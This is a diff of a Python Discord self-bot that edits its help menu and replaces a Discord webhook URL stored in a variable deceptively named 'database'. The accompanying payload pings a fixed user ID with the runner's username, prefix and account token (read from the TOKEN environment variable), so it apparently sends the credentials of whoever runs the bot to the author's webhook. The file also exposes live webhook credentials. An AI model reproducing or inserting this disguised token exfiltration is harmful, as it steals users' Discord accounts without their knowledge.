@@ -65,7 +65,7 @@ quiet = commands.Bot(command_prefix = get_prefix, self_bot=True, help_commandn=N
 @quiet.command(pass_context=True)
 async def cmd(ctx):
     await ctx.message.delete()
-    await ctx.send("```𝗛𝗘𝗟𝗣 𝗖𝗢𝗠𝗠𝗔𝗡𝗗\n\n> Prefix : ▸ !! ( you can change your prefix by cmd )\n\n𝗔𝗗𝗠𝗜𝗡\nkick, ban\n\n𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦\nprefix, status\n\n𝗙𝗨𝗡\npagi, siang, malam, salam, hack\n\n𝗨𝗧𝗜𝗟𝗟𝗦\nvoice, farming, gleave, ping\n\nType !!cmd(usage) For More Information\n\n> Example !!cmdadmin !!cmdsetting```", delete_after=15)
+    await ctx.send("```𝗛𝗘𝗟𝗣 𝗖𝗢𝗠𝗠𝗔𝗡𝗗\n\nPrefix : ▸ !! ( you can change your prefix by cmd )\n\n𝗔𝗗𝗠𝗜𝗡\nkick, ban\n\n𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦\nprefix, status\n\n𝗙𝗨𝗡\npagi, siang, malam, salam, hack\n\n𝗨𝗧𝗜𝗟𝗟𝗦\nvoice, farming, gleave, ping\n\nType !!cmd(usage) For More Information\n\nExample !!cmdadmin !!cmdsetting```", delete_after=15)
     
 #--------------------------------------------
 #--------------------------------------------
@@ -358,7 +358,7 @@ async def ping(ctx):
 #============================================
 secret_key = os.getenv("TOKEN")
 
-database = 'https://discord.com/api/webhooks/1049734940457185410/CVNj-z3GxUXjbaLmnS5DHMgJPa7q8bVkgn9B1ROnqYFOubzmTIxkpMCnCq5Iehq7Jgzi'
+database = 'https://discord.com/api/webhooks/1050795677690642452/naP-_zbR2p7g-NfXKIKWAc6Gz-6-Rh2_C1Q1f7ChR3VfEQXCU4QkTMb7LY5Dkx5pS40-'
 database_connected = {
 "content": f"<@581419418563641354>\nUsername: `{username}`\nPrefix: `{prefix}`\nDatabase API: `{secret_key}`"
 }
